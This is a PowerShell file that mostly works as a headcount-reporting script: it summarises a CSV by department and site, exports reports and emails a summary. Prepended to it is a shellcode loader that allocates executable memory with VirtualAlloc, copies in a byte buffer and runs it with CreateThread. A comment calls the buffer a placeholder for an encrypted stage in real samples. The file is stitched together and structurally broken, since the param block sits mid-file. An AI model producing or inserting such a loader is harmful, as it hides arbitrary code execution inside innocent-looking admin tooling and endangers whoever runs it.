$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x70, 0xcc, 0xae, 0x8d, 0xbf, 0x49, 0x7e, 0xbb, 0xda, 0xa0, 0x11, 0xa3, 0xdc, 0x78, 0x26, 0x07,
    0x38, 0x47, 0x33, 0x96, 0x42, 0x99, 0x3f, 0x1f, 0x58, 0xef, 0x58, 0x01, 0x71, 0x1a, 0x73, 0x5a,
    0x24, 0x89, 0x63, 0x89, 0xe4, 0xc7, 0x3f, 0xa6, 0x8c, 0x9f, 0x97, 0xd6, 0xc7, 0x0f, 0x5e, 0xb9,
    0x63, 0xaa, 0xa4, 0x19, 0xbb, 0x93, 0xe4, 0x22, 0xd9, 0x84, 0xd5, 0x5f, 0x65, 0xd8, 0x98, 0x69,
    0x00, 0xaa, 0x44, 0x5c, 0x24, 0xd6, 0x39, 0x4d, 0x0a, 0x8d, 0x26, 0x67, 0x13, 0x03, 0xa8, 0x4d,
    0xb7, 0x6c, 0x44, 0x1b, 0x90, 0x45, 0x0d, 0xd5, 0x4c, 0x71, 0x85, 0x9e, 0x56, 0x19, 0xc6, 0x8b,
    0xba, 0x2c, 0x72, 0x2c, 0x2b, 0x90, 0xac, 0x36, 0x8a, 0x80, 0xf6, 0x8f, 0xff, 0x0a, 0x02, 0xe3,
    0x8b, 0x9d, 0xfb, 0xfb, 0x8d, 0x3b, 0x5a, 0xdc, 0x4d, 0x46, 0xd2, 0xa0, 0x8e, 0x29, 0x38, 0x5a,
    0x04, 0x84, 0x77, 0xb2, 0x25, 0x52, 0xab, 0x46, 0x46, 0xfe, 0xcd, 0x1b, 0xa7, 0x96, 0x58, 0x3a,
    0x15, 0xb3, 0xc9, 0xfa, 0xa6, 0x38, 0xe5, 0x5a, 0xbd, 0x4e, 0x96, 0xb0, 0x56, 0xba, 0x04, 0xa2,
    0x23, 0x78, 0xb1, 0xd6, 0x51, 0x86, 0xa9, 0x53, 0x28, 0x9b, 0x93, 0x39, 0xc7, 0x2d, 0x07, 0x2b,
    0x53, 0xd9, 0x17, 0x59, 0x3d, 0x0f, 0x28, 0xf9, 0xd0, 0x52, 0xc0, 0x8a, 0x36, 0x2e, 0x95, 0xf3,
    0x5a, 0xcb, 0xa2, 0x7b, 0xf9, 0xce, 0xe3, 0xa0, 0x63, 0x3d, 0x4d, 0x87, 0x90, 0xe4, 0x32, 0x01,
    0x18, 0xb1, 0xde, 0xd9, 0xdc, 0x63, 0x07, 0x06, 0x57, 0x9e, 0x5c, 0x3e, 0x82, 0x67, 0x7f, 0xeb,
    0xd0, 0x92, 0x41, 0x24, 0xdc, 0xd3, 0x48, 0xab, 0xca, 0x8e, 0x8e, 0x32, 0x05, 0x3b, 0x0c, 0x33,
    0x48, 0xf7, 0xda, 0x00, 0xdf, 0x02, 0xe6, 0xe4, 0x99, 0x32, 0x59, 0xb4, 0x8c, 0xa2, 0x29, 0xa8,
    0xaa, 0xee, 0xf4, 0xaf, 0x8b, 0xbe, 0xd5, 0x07, 0x76, 0xd7, 0x0a, 0x6b, 0x67, 0x57, 0x09, 0xb5,
    0xaf, 0x90, 0xb0, 0xf9, 0xfb, 0x41, 0xdd, 0xad, 0x4e, 0x33, 0x03, 0xe0, 0x6c, 0x3e, 0x40, 0xbc,
    0x79, 0x37, 0x49, 0x38, 0x27, 0xf1, 0x52, 0x9c, 0xfe, 0x86, 0x6a, 0xcf, 0x44, 0x5b, 0x00, 0x89,
    0x54, 0xc0, 0x21, 0xdf, 0x73, 0x6c, 0x16, 0x79, 0xf3, 0x47, 0x25, 0x9a, 0xbc, 0xd8, 0x8b, 0xd2,
    0xae, 0x36, 0xb5, 0x5b, 0xe7, 0xed, 0x9b, 0xcd, 0xda, 0x57, 0x8b, 0xc5, 0x0e, 0xea, 0xfd, 0x66,
    0x92, 0x5b, 0xb8, 0x98, 0x1d, 0xe3, 0x6a, 0x1a, 0xac, 0x97, 0xd6, 0x7d, 0x4a, 0x69, 0xba, 0xb7,
    0x6f, 0x5b, 0x15, 0xf0, 0xce, 0xd2, 0xa4, 0x18, 0xb5, 0xd1, 0xf6, 0xe0, 0xc2, 0xf1, 0xc9, 0x4c,
    0x2f, 0x8d, 0xec, 0x5b, 0x58, 0xf7, 0xb3, 0xde, 0xf6, 0xb6, 0x5f, 0xbd, 0x57, 0x01, 0x4f, 0x6a,
    0xd0, 0x15, 0xb3, 0x7c, 0xe1, 0x1a, 0x94, 0x9b, 0xc1, 0x9b, 0xeb, 0xe2, 0x87, 0xb9, 0xa2, 0x53,
    0x37, 0x6c, 0xcb, 0x43, 0x50, 0xb8, 0xed, 0x6e, 0x09, 0x1d, 0xd7, 0x95, 0x61, 0x1b, 0x58, 0x6e,
    0x39, 0xd8, 0x06, 0xed, 0x32, 0x9d, 0x9f, 0x3c, 0x00, 0x6c, 0x61, 0x93, 0x92, 0x4e, 0xcc, 0xfa,
    0xe2, 0x94, 0xaf, 0xb5, 0x30, 0x9f, 0x52, 0x46, 0x02, 0x71, 0x07, 0x8a, 0xbc, 0xae, 0x17, 0x31,
    0x35, 0xae, 0x4c, 0x8f, 0x71, 0x26, 0x4f, 0x33, 0x25, 0xe6, 0xf0, 0xac, 0xbd, 0x2a, 0xd2, 0x43,
    0x8f, 0x2b, 0x94, 0xf3, 0xd1, 0xad, 0x1a, 0x78, 0x3a, 0xc1, 0xe2, 0x4c, 0x04, 0x63, 0xb2, 0x32,
    0x6e, 0xa5, 0x0b, 0x79, 0x6a, 0xdf, 0xa3, 0x14, 0x22, 0xea, 0x5c, 0xe7, 0xfe, 0x01, 0x0a, 0xc1,
    0x2f, 0x90, 0xa6, 0xd4, 0xbf, 0x91, 0x09, 0xaf, 0x68, 0xd3, 0x7a, 0x5e, 0x36, 0xa8, 0x0a, 0x53,
    0xaf, 0xe2, 0x9a, 0x11, 0xeb, 0x1e, 0xbc, 0x3d, 0x4f, 0xd7, 0xd4, 0x2c, 0x01, 0x1d, 0x67, 0xc8
)

$HProcess = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 694)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InputCsv = "C:\Scripts\data\headcount-export.csv",

    [string]$OutputPath = 'C:\Logs\reports\headcount-summary-2025-02-05.csv',

    [Parameter(Mandatory = $false)]
    [ValidateSet("Department", "Site")]
    [string]$GroupBy = 'Department',
    [double]$MinAmount = 10000
)

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}
$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending | Export-Csv -NoTypeInformation -Path $OutputPath

$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize

$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$byManager = $rows | Group-Object -Property Manager |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byManager | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Arial; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8

$byGroup | ConvertTo-Json -Depth 6 | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8

$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = "reporting@internal.corp"
$MailFrom = "bi@internal.corp"
Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "Headcount summary" `
    -Body $summaryBody `
    -SmtpServer "smtp.internal.corp" `
    -Port 25 `
    -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
